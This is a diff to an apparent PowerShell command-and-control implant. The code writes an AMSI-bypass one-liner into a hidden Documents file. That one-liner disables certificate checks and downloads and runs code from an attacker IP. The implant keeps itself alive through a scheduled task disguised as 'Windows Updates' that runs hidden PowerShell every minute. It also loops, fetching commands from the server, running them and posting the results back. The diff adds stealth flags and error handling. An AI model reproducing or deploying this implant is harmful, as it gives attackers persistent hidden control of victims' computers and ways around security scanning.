@@ -107,38 +107,45 @@ $name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POS
 $taskl   = ("https" + ':' + "//$ip" + ':' + "$port/tasks/$name/")    # --> https://192.168.19.133:8000/tasks/SDFCXS
 $resultl = ("https" + ':' + "//$ip" + ':' + "$port/results/$name/")
 
-#echo PAYLOAD into file
-$oneliner = "`$apple=[Ref].Assembly.GetTypes();ForEach(`$banana in `$apple) {if (`$banana.Name -like `"*siUtils`") {`$cherry=`$banana}};`$dogwater=`$cherry.GetFields('NonPublic,Static');ForEach(`$earache in `$dogwater) {if (`$earache.Name -like `"`*InitFailed`") {`$foxhole=`$earache}};`$foxhole.SetValue(`$null,`$true); [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}; IEX(New-Object Net.WebClient).DownloadString('https://192.168.1.50:8000/sc/eth0')"
-echo $oneliner > "C:\Users\$env:USERNAME\Documents\logs.txt"
+if (Test-Path "C:\Users\$env:USERNAME\Documents\logs.txt") {
+    # Code to execute if file exists
+} else {
 
-#Set permission to be accsesible
-$acl = Get-Acl C:\Users\$env:USERNAME\Documents\logs.txt
-$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("$env:USERNAME","FullControl","Allow")
-$acl.SetAccessRule($AccessRule)
-$acl | Set-Acl C:\Users\$env:USERNAME\Documents\logs.txt
+    #echo PAYLOAD into file
+    $oneliner = ("`$apple=[Ref].Assembly.GetTypes();ForEach(`$banana in `$apple) {if (`$banana.Name -like `"*siUtils`") {`$cherry=`$banana}};`$dogwater=`$cherry.GetFields('NonPublic,Static');ForEach(`$earache in `$dogwater) {if (`$earache.Name -like `"`*InitFailed`") {`$foxhole=`$earache}};`$foxhole.SetValue(`$null,`$true); [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}; IEX(New-Object Net.WebClient).DownloadString('https://" + $ip + ":8000/sc/eth0')")
+    echo $oneliner > "C:\Users\$env:USERNAME\Documents\logs.txt"
+
+    #hide the file
+    $FILE=Get-Item '~\Documents\logs.txt' -Force
+    $FILE.attributes='Hidden'
+}
 
 
-#hide the file
-$FILE=Get-Item '~\Documents\logs.txt' -Force
-$FILE.attributes='Hidden'
 
 #schadule a task to run the oneliner
-schtasks /create /sc minute /mo 1 /tn "Windows Updates" /tr "C:\Windows\System32\cmd.exe /c type %USERPROFILE%\Documents\logs.txt | powershell -ep bypass" /F
+schtasks /create /sc minute /mo 1 /tn "Windows Updates" /tr "C:\Windows\System32\cmd.exe /c type %USERPROFILE%\Documents\logs.txt | powershell -nop -w hidden -ep bypass" /F
 
 #Loop to check for tasks, recieve, execute & sends results in result Link
 for (;;){
+    try {
+        # Code that might throw an error
+     
 
     $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
     
     if (-Not [string]::IsNullOrEmpty($task)){
         
-        $result = Invoke-Executable -sExeFile 'powershell' -cArgs @('-ep bypass /c', $task)
+        $result = Invoke-Executable -sExeFile 'powershell' -cArgs @('-nop -w hidden -ep bypass /c', $task)
         $data = @{result = "$result"}
 
         Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST' # --> https://192.168.71.142:8000/results/GTLBHU/
-
+#####powershell dasdsasadasds | 
     }
     Start-Sleep -Seconds $n
+    }catch [System.Net.WebException] {
+        # Code to execute if WebException is thrown
+       break
+    }
 
 }
 
